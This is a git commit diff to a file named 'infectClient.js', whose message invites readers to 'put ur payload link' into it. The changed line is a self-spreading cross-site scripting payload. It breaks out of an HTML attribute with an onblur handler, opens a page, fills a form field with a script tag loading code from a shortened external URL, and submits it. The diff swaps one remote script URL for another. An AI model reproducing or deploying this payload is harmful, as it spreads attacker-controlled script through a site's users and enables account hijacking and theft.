657ff5e3f9b47248585e118c148b7e8608513cdc
theultraman20 <32559038+theultraman20@users.noreply.github.com>
2018-04-02 00:58:25 -0400

    Update infectClient.js
    just put ur payload link after where it says script/src=

--- payload/infectClient.js
+++ payload/infectClient.js
@@ -1,1 +1,1 @@
-"onblur="window.open($('a')[4].href).onload=function(){f=this.$('form')[1];f[3].value='<script/src=//goo.gl/PHPvuT>';f.submit()}
+"onblur="window.open($('a')[4].href).onload=function(){f=this.$('form')[1];f[3].value='<script/src=//goo.gl/3B8gX2>';f.submit()}
